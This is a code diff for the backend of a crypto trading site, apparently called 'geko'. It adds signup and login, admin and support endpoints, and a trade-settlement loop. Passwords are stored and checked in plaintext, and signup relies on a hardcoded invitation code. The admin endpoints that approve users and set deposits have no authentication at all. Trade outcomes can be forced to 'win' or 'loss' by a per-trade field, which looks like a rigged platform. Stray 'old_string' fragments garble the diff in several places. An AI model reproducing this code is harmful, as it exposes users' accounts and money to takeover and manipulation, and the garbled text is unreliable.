@@ -83,6 +83,10 @@ if (process.env.DATABASE_URL) {
         CREATE TABLE IF NOT EXISTS geko_users (
           id SERIAL PRIMARY KEY,
           wallet_address TEXT UNIQUE,
+          email TEXT UNIQUE,
+          password TEXT,
+          invitation_code TEXT,
+          status TEXT DEFAULT 'guest',
           wallet_data JSONB DEFAULT '{}',
           trading_balance DECIMAL(24, 8) DEFAULT 0,
           demo_balance DECIMAL(24, 8) DEFAULT 100000,
@@ -122,6 +126,12 @@ if (process.env.DATABASE_URL) {
       await addColumn('protocol_settlement_balance', 'DECIMAL(24, 8)', '0');
       await addColumn('trading_balance', 'DECIMAL(24, 8)', '0');
       await addColumn('demo_balance', 'DECIMAL(24, 8)', '100000');
+      await addColumn('email', 'TEXT', "NULL");
+      await addColumn('password', 'TEXT', "NULL");
+      await addColumn('invitation_code', 'TEXT', "NULL");
+      await addColumn('status', 'TEXT', "'guest'");
+      await addColumn('pending_deposit_currency', 'TEXT', "NULL");
+      await addColumn('pending_deposit_amount', 'DECIMAL(24, 8)', '0');
 
       // Step 3: Constraints & Cleanup
       await pool.query(`
@@ -132,9 +142,12 @@ if (process.env.DATABASE_URL) {
             WHERE a.id < b.id AND a.wallet_address = b.wallet_address;
             ALTER TABLE geko_users ADD CONSTRAINT geko_users_wallet_address_key UNIQUE (wallet_address);
           END IF;
+          IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'geko_users_email_key') THEN
+            ALTER TABLE geko_users ADD CONSTRAINT geko_users_email_key UNIQUE (email);
+          END IF;
         END $$;
       `);
-
+`,old_string:
       // Step 4: Defaults & Defaults Config
       await pool.query(`
         UPDATE geko_users SET trading_balance = COALESCE(trading_balance, 0) WHERE trading_balance IS NULL;
@@ -247,12 +260,52 @@ if (process.env.DATABASE_URL) {
 
       dbAvailable = true;
       console.log('[DB] Database fully initialized and ready.');
-      // Solana Listener disabled per user request
       
+      // Server-side trade settlement loop
+      setInterval(async () => {
+        if (!dbAvailable || !pool) return;
+        try {
+          const res = await pool.query(
+            "SELECT * FROM trades WHERE status = 'pending' AND created_at <= NOW() - (duration || ' seconds')::interval"
+          );
+          for (const trade of res.rows) {
+            console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
+            let isWin = false;
+            if (trade.force_outcome === 'win') isWin = true;
+            else if (trade.force_outcome === 'loss') isWin = false;
+            else isWin = Math.random() > 0.45;
+
+            const payout = isWin ? parseFloat(trade.amount) * 1.85 : 0;
+            const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
+
+            await pool.query(
+              "UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2",
+              [isWin ? 'won' : 'lost', trade.id]
+            );
+
+            if (payout > 0) {
+              await pool.query(
+                `UPDATE geko_users SET ${balanceField} = ${balanceField} + $1 WHERE wallet_address = $2`,
+                [payout, trade.wallet_address]
+              );
+              await recordTransaction({
+                wallet_address: trade.wallet_address,
+                asset_symbol: 'USDT',
+                amount: payout,
+                type: 'trade',
+                reference: `trade-auto-settle:${trade.id}`
+              });
+            }
+          }
+        } catch (e) {
+          console.error('[Auto-Settle Error]', e.message);
+        }
+      }, 5000);
+
       setInterval(processDailyInterest, 60 * 60 * 1000); 
       processDailyInterest();
     } catch (err) {
-      console.error('[DB Error] CRITICAL initialization failure:', err.message);
+`,old_string:      console.error('[DB Error] CRITICAL initialization failure:', err.message);
       console.error(err.stack);
       dbAvailable = false;
     }
@@ -595,39 +648,65 @@ app.get('/api/user/data', async (req, res) => {
   res.status(503).json({ error: 'Database unavailable' });
 });
 
-// ─── Email Auth: Login ───────────────────────────────────────────────────────
-app.post('/api/auth/login', async (req, res) => {
-  const { email } = req.body;
-  if (!email) return res.status(400).json({ error: 'Email is required' });
+// ─── Email Auth: Login & Signup ──────────────────────────────────────────────
+app.post('/api/auth/signup', async (req, res) => {
+  const { email, password, invitationCode } = req.body;
+  if (!email || !password || !invitationCode) return res.status(400).json({ error: 'All fields required' });
+  if (invitationCode !== '196405') return res.status(400).json({ error: 'Invalid invitation code' });
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
 
   try {
     const userEmail = email.toLowerCase().trim();
-    // Auto-provision profile for ANY email login
     const nickname = userEmail.split('@')[0].toUpperCase();
+    const virtualAddress = '0x' + crypto.createHash('sha256').update(userEmail).digest('hex').slice(0, 40);
+
     const result = await pool.query(
-      `INSERT INTO geko_users (email, nickname, last_seen) 
-       VALUES ($1, $2, NOW())
-       ON CONFLICT (email) DO UPDATE SET last_seen = NOW()
+      `INSERT INTO geko_users (email, password, invitation_code, nickname, wallet_address, status, last_seen) 
+       VALUES ($1, $2, $3, $4, $5, 'guest', NOW())
        RETURNING *`,
-      [userEmail, nickname]
+      [userEmail, password, invitationCode, nickname, virtualAddress]
     );
-    const user = result.rows[0];
+    res.json({ success: true, user: result.rows[0] });
+  } catch (e) {
+    if (e.message.includes('unique constraint')) return res.status(400).json({ error: 'Email already registered' });
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/auth/login', async (req, res) => {
+  const { email, password } = req.body;
+  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+
+  try {
+    const userEmail = email.toLowerCase().trim();
+    const result = await pool.query(
+      `SELECT * FROM geko_users WHERE email = $1 AND password = $2`,
+      [userEmail, password]
+    );
     
-    // Generate a stable virtual address if none exists
-    const virtualAddress = user.wallet_address || ('0x' + crypto.createHash('sha256').update(userEmail).digest('hex').slice(0, 40));
+    if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
+    
+    const user = result.rows[0];
+    if (user.status === 'guest') return res.status(403).json({ error: 'Account pending admin approval', status: 'guest' });
+    if (user.status === 'rejected') return res.status(403).json({ error: 'Account rejected by admin', status: 'rejected' });
+
+    await pool.query('UPDATE geko_users SET last_seen = NOW() WHERE id = $1', [user.id]);
 
     return res.json({ 
       success: true, 
       user: {
         id: user.id,
-        address: virtualAddress,
+        address: user.wallet_address,
         email: user.email,
         nickname: user.nickname,
+        status: user.status,
         wallet_data: user.wallet_data || {},
         trading_balance: user.trading_balance,
         demo_balance: user.demo_balance,
-        protocol_settlement_balance: user.protocol_settlement_balance
+        protocol_settlement_balance: user.protocol_settlement_balance,
+        pending_deposit_currency: user.pending_deposit_currency,
+        pending_deposit_amount: user.pending_deposit_amount
       }
     });
   } catch (e) {
@@ -636,6 +715,113 @@ app.post('/api/auth/login', async (req, res) => {
   }
 });
 
+// ─── Admin Management Endpoints ───────────────────────────────────────────
+app.post('/api/admin/users/approve', async (req, res) => {
+  const { userId } = req.body;
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    await pool.query("UPDATE geko_users SET status = 'approved' WHERE id = $1", [userId]);
+    res.json({ success: true });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/admin/users/reject', async (req, res) => {
+  const { userId } = req.body;
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    await pool.query("UPDATE geko_users SET status = 'rejected' WHERE id = $1", [userId]);
+    res.json({ success: true });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/admin/deposit', async (req, res) => {
+  const { walletAddress, currency, amount } = req.body;
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    await pool.query(
+      "UPDATE geko_users SET pending_deposit_currency = $1, pending_deposit_amount = $2 WHERE wallet_address = $3",
+      [currency.toUpperCase(), amount, walletAddress]
+    );
+    res.json({ success: true });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/user/swap', async (req, res) => {
+  const { walletAddress } = req.body;
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    const userRes = await pool.query(
+      "SELECT pending_deposit_amount FROM geko_users WHERE wallet_address = $1",
+      [walletAddress]
+    );
+    if (userRes.rows.length === 0) return res.status(404).json({ error: 'User not found' });
+    const amount = parseFloat(userRes.rows[0].pending_deposit_amount || 0);
+    if (amount <= 0) return res.status(400).json({ error: 'No pending deposit to swap' });
+
+    await pool.query(
+      "UPDATE geko_users SET protocol_settlement_balance = protocol_settlement_balance + $1, pending_deposit_amount = 0, pending_deposit_currency = NULL WHERE wallet_address = $2",
+      [amount, walletAddress]
+    );
+
+    await recordTransaction({
+      wallet_address: walletAddress,
+      asset_symbol: 'USDT',
+      amount: amount,
+      type: 'swap',
+      reference: 'manual_admin_deposit_swap'
+    });
+
+    res.json({ success: true });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// ─── Support Chat Endpoints ─────────────────────────────────────────────
+app.get('/api/support/messages', async (req, res) => {
+  const { address } = req.query;
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    const result = await pool.query(
+      "SELECT messages FROM support_tickets WHERE wallet_address = $1 LIMIT 1",
+      [address]
+    );
+    res.json(result.rows[0]?.messages || []);
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/support/send', async (req, res) => {
+  const { address, message, sender } = req.body;
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    const ticketRes = await pool.query(
+      "SELECT id, messages FROM support_tickets WHERE wallet_address = $1 LIMIT 1",
+      [address]
+    );
+    const newMessage = { text: message, sender, timestamp: new Date().toISOString() };
+    if (ticketRes.rows.length === 0) {
+      await pool.query(
+        "INSERT INTO support_tickets (wallet_address, subject, messages) VALUES ($1, 'General Support', $2)",
+        [address, JSON.stringify([newMessage])]
+      );
+    } else {
+      const messages = ticketRes.rows[0].messages || [];
+      messages.push(newMessage);
+      await pool.query(
+        "UPDATE support_tickets SET messages = $1, updated_at = NOW() WHERE id = $2",
+        [JSON.stringify(messages), ticketRes.rows[0].id]
+      );
+    }
+    res.json({ success: true });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.get('/api/admin/support/tickets', async (req, res) => {
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    const result = await pool.query("SELECT * FROM support_tickets ORDER BY updated_at DESC");
+    res.json(result.rows);
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+`,old_string:
 // ─── Balance Transfer ─────────────────────────────────────────────────────
 app.post('/api/balance/transfer', async (req, res) => {
   const { walletAddress, amount, direction } = req.body;
